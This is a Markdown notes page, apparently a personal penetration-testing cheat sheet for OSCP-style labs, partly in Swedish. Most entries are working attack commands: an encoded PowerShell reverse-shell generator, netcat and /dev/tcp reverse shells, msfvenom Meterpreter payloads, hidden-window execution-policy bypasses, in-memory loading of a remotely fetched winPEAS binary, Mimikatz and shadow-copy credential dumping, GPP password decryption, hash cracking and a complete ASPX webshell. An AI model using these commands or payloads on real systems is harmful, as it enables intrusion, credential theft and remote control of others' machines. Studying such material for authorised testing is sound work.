@@ -1,0 +1,399 @@
+---
+{"dg-publish":true,"permalink":"/misc/"}
+---
+
+---------------
+### Windows Encoded Revshell Python Script:
+```python
+import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.166",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+print(cmd)
+```
+### Remote shell with PSExec
+```
+sudo /usr/bin/impacket-wmiexec joe:Flowers1@172.16.231.11
+```
+### John hash-cracking:
+``` bash
+#Ta reda på hashtypen
+hashid -e -j '<hash>'
+hash-identifier <hash>
+
+#Cracka med dictionary
+john --wordlist=rockyou.txt --rules=regelnamn --format=<hashidformat> hash.txt
+
+#Visa hashen igen
+john --show pass.txt
+```
+#### Importera /bin/bash med python:
+``` bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+```
+#### WordPress-login Shell:
+``` bash
+sudo msfconsole
+use exploit/unix/webapp/wp_admin_shell_upload
+```
+### Windows file locate in CMD:
+``` powershell
+cd C:/ && dir "<filename>" /s /b
+```
+### Windows file locate in PowerShell:
+``` powershell
+#General file/directory locate
+Get-ChildItem -Path C:\ -Include "<name>" -File -Recurse -ErrorAction SilentlyContinue
+
+#Locate specific file-format
+Get-ChildItem -Path C:\ -Include *.<format> -File -Recurse -ErrorAction SilentlyContinue
+
+#Locate flag.txt from current dir:
+Get-ChildItem -Path .\ -Include "flag.txt" -File -Recurse -ErrorAction SilentlyContinue
+```
+#### Linux RDP:
+``` bash
+rdesktop -u <username> 192.168.224.196
+
+xfreerdp /u:username /v:192.168.224.196 /cert:ignore /d:domain.com /pth:hash
+```
+#### Windows Host-file:
+``` powershell
+C:\Windows\System32\drivers\etc
+```
+### Metasploit Listener:
+``` bash
+sudo msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.X.X;set LPORT XXX;run;"
+```
+### Powershell Evasion Command:
+```powershell
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -encodedCommand
+```
+### Unzippa gz:
+``` bash
+sudo gzip -d 
+```
+
+### Traitor Auto Linux Privesc:
+```
+traitor -a -p <userpass>
+```
+### Head:
+``` bash
+head -n 1000 input.txt > output.txt
+```
+### Radera list-entries som börjar med X:
+``` bash
+sed -i '/^test/d' lista.txt
+```
+### File Transfer from Windows with SMB
+``` bash
+1. Starta SMB på Linux:
+sudo impacket-smbserver <mappnamn> . -smb2support
+
+2. Kopiera över filen från Windows:
+copy <filepath> \\<linux-ip>\<mappnamn>
+
+3. Döda sessionen på Linux:
+sudo kill -9 $(ps -A | grep python | awk '{print $1}')
+```
+### File transfer from Windows with SCP:
+``` powershell
+scp <file> crabfeather@192.168.45.X:<remotepath>
+```
+### SSH-key Permissions:
+``` bash
+chmod 600 <key>
+```
+### Windows Runas:
+``` powershell
+runas /user:<username> <program>
+```
+- Add "/netonly" for only using that users credentials for net activities
+### WinPEAS In-memory Obfuscated Execution:
+``` powershell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://192.168.45.172:8000/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+powershell.exe -NoP -NonI -Exec Bypass -encodedCommand JAB3AHAAPQBbAFMAeQBzAHQ...
+
+```
+### Enable RDP:
+```
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+```
+### Evil-WinRM:
+``` bash
+evil-winrm -i 192.168.X.X -u <user> -p "qwertqwertqwert123\!\!"
+```
+
+### Good Nmap Scan:
+```
+sudo nmap -A -Pn -n 172.16.248.10
+```
+### PowerShell Download Binary:
+``` powershell
+iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
+```
+### Take control of Windows folder in PowerShell:
+``` powershell
+icacls "C:\Path\to\folder" /setowner "<youruser>" /T /C
+```
+### PostgreSQL workings:
+``` powershell
+#Connect to server
+psql -h <ip> -p <port> -U postgres
+
+#List datbases (exit with q)
+\l
+
+#Connect to database
+\c <databasename>
+
+#Dump from table
+SELECT * FROM <tablename>;
+
+#Confluence server example:
+\c confluence
+SELECT * FROM cwd_user;
+```
+### Powershell Wget:
+```powershell
+powershell wget -Uri <url> -OutFile <outfile>
+```
+### Netcat reverse shell:
+```bash
+nc.exe -e cmd.exe <remoteip> <port>
+```
+### Apache web server:
+```bash
+# Start server:
+sudo systemctl start apache2
+
+#File location:
+/var/www/html/
+
+#Inspect access log:
+tail -f /var/log/apache2/access.log
+```
+### Add user linux:
+```bash
+#Create user:
+sudo useradd <user>
+
+#Set password:
+sudo passwd <user>
+
+#View sudo rights:
+sudo visudo
+
+#Edit sudoers file:
+nano /etc/sudoers
+..or..
+sudo visudo
+```
+### Background service:
+```bash
+> /dev/null 2>&1 &
+```
+### SSH through SOCKS:
+```bash
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+```
+### Custom wordlist based on known password:
+```bash
+#Example:
+crunch 6 6 -t Lab%%% > out.list
+
+#Explanation:
+crunch <mincharlen> <maxcharlen> -t (specify pattern) Lab%%% (hardcoded "Lab" plus three numeric digits) > out.list
+```
+### Windows Meterpreter payload:
+```bash
+sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.199 LPORT=443 -f exe -o met.exe
+```
+### Meterpreter Port Forwarding:
+```
+route add <ip-or-range> <msfsessionid>
+```
+### Decrypt GPP-stored Windows passwords:
+```bash
+gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+```
+### Access Http SPN from Powershell:
+```powershell
+#Regular access:
+iwr -UseDefaultCredentials http://web04
+
+#Display content:
+(iwr -UseDefaultCredentials http://web04).Content
+```
+### Remote PS-Session as Domain Admin:
+```powershell
+Enter-PSSession -ComputerName <name>
+```
+### SMB Recursive Download:
+```bash
+smbclient '\\server\share'
+mask ""
+recurse ON
+prompt OFF
+cd 'path\to\remote\dir'
+lcd '~/path/to/download/to/'
+mget *
+```
+### Disk Storage of Current Directory in Linux:
+```bash
+du -sh
+```
+### Enumerate .NET version in Powershell:
+```powershell
+Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name version -EA 0 | Where { $_.PSChildName -Match '^(?!S)\p{L}'} | Select PSChildName, version
+```
+### List available shells in Unix:
+```bash
+cat /etc/shells
+```
+### Cross-compile older kernel exploits with library version errors:
+https://github.com/X0RW3LL/XenSpawn
+```bash
+1. Start container machine:
+systemd-nspawn -M xenmachine
+
+2. Compile exploit.
+
+3. Change user to root and fetch files from:
+/var/lib/machines/xenmachine/root
+```
+
+### Crack zip-file with John:
+``` bash
+zip2john <zip-file> >> hash.txt
+john --wordlist=/usr/share/wordlists/rockyou/rockyou.txt hash.txt
+```
+
+### Search terms for grep:
+```
+pass
+key
+user
+secr
+pwd
+```
+### Good detailed directory busting wordlist:
+```bash
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+```
+### Unzip .tar:
+``` bash
+tar -xf
+```
+
+### Debugging curl command:
+```bash
+curl -sSik
+```
+
+### Autorecon:
+```bash
+sudo ~/.local/bin/autorecon -v 192.168.217.151 --nmap-append=-A
+```
+
+### API endpoint wordlist:
+```bash
+/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+```
+
+### Is user admin in Windows:
+```powershell
+([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+```
+
+### OSCP Windows 64-bit payload:
+```bash
+sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f exe -o shelle.exe
+```
+### Linux background reverse shell using screen:
+```bash
+screen -md bash -c 'bash -i >/dev/tcp/10.1.1.20/443 2>&1 0<&1'
+```
+### Mimikatz all-in-one command:
+```
+.\mimi.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
+```
+### Windows abuse functions:
+```
+# Add user to group:
+net group "Management Department" <user> /add /domain
+
+# Delete user:
+net group "Management Department" <user> /del /domain
+
+# Change user password:
+net user <username> <newpassword> /domain
+```
+### MSF/Metasploit $env error fix:
+```
+export PATH=/var/lib/gems/3.1.0:$PATH
+```
+### Extract hashes from lsa.DMP:
+```
+pypykatz lsa minidump lsass.DMP
+```
+### Group Policy (GPO) extraction:
+```
+gpresults /h out.html
+```
+### Aspx webshell:
+```
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">      
+
+Sub RunCmd(Src As Object, E As EventArgs)            
+  Dim myProcess As New Process()            
+  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
+  myProcessStartInfo.UseShellExecute = false            
+  myProcessStartInfo.RedirectStandardOutput = true            
+  myProcess.StartInfo = myProcessStartInfo            
+  myProcessStartInfo.Arguments=xcmd.text            
+  myProcess.Start()            
+
+  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
+  Dim myString As String = myStreamReader.Readtoend()            
+  myProcess.Close()            
+  mystring=replace(mystring,"<","&lt;")            
+  mystring=replace(mystring,">","&gt;")            
+  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
+End Sub
+
+</script>
+
+<html>
+<body>    
+<form runat="server">        
+<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
+<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
+<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
+<p><asp:Label id="result" runat="server"></asp:Label>       
+</form>
+</body>
+</html>
+```
+### Enumerate domain admins:
+```
+(Get-ADGroupMember -Identity "Domain Admins" -Recursive | Get-ADUser | Select-Object -ExpandProperty SamAccountName)
+```
+### Dump SAM using vssadmin:
+```
+vssadmin CREATE SHADOW /For=C:
+cmd /c 'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\Users\Public\SYSTEM'
+cmd /c 'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM C:\Users\Public\SAM'
+```
